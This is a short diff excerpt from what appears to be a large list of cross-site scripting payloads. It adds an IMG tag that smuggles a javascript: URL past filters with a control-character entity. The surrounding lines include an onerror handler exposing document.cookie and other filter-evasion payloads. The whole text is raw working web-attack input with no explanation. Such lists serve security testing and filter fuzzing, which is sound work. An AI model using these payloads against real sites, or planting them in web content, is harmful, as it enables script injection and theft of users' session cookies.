@@ -21005,3 +21005,5 @@ xyz';"/></textarea><Img Src=OnXSS OnError=prompt(document.cookie)>
 (Z("onerror="a=print,a`1`"))
 zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//
 "<zzz><style>@keyframes+x+{}</style><xss+style="animation-Name:+x"+onwebkitanimationstart="print()"></xss>
+<IMG SRC=" &#14;  javascript:alert(940
+);">
